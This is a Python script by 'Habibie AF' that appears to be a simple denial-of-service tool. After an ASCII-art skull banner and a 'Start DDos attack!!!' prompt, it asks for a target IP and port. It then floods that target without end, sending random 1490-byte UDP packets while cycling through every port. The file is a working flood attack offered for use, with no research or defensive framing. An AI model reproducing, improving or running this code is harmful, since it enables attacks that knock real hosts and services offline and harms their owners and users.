import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

time.sleep(3)
os.system("clear") 
print ("")
print ("            _,.-------.,_ ")
time.sleep (0.03)
print ("        ,;~'             '~;, ")
time.sleep (0.03)
print ("      ,;                     ;, ")
time.sleep (0.03)
print ("     ;                         ; ")
time.sleep (0.03)
print ("    ,'                         ', ")
time.sleep (0.03)
print ("   ,;                           ;, ")
time.sleep (0.03)
print ("   ; ;      .           .      ; ; ")
time.sleep (0.03)
print ("   | ;   ______       ______   ; | ")
time.sleep (0.03)
print ("   |  '/~'     ~' . '~     '~\'  | ")
time.sleep (0.03)
print ("   |  ~  ,-~~~^~, | ,~^~~~-,  ~  | ")
time.sleep (0.03)
print ("    |   |        }:{        |   | ")
time.sleep (0.03)
print ("    |   l       / | \       !   | ")
time.sleep (0.03)
print ("    .~  (__,.--' .^. '--.,__)  ~. ")
time.sleep (0.03)
print ("    |     ---;' / | \ ';---     | ")
time.sleep (0.03)
print ("     \__.       \/^\/       .__/ ")
time.sleep (0.03)
print ("      V| \                 / |V ")
time.sleep (0.03)
print ("       | |T~\___!___!___/~T| | ")
time.sleep (0.03)
print ("       | |'IIII_I_I_I_IIII'| | ")
time.sleep (0.03)
print ("       |  \,III I I I III,/  | ")
time.sleep (0.03)
print ("        \   '~~~~~~~~~~'    / ")
time.sleep (0.03)
print ("          \   .       .   / ")
time.sleep (0.03)
print ("            \.    ^    ./ " )
time.sleep (0.03)
print ("              ^~~~^~~~^  ")
time.sleep (0.03)
print ("")
print ("=========================================")
time.sleep (0.03)
print ("                WELCOME                  ")
time.sleep (0.03)
print ("=========================================")
time.sleep (0.03)
print ("          == By Habibie AF ==            ")

print ("")
time.sleep(10)
print
os.system("clear")
print
print
print ("Start DDos attack!!!")
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
     if port == 65534:
       port = 1 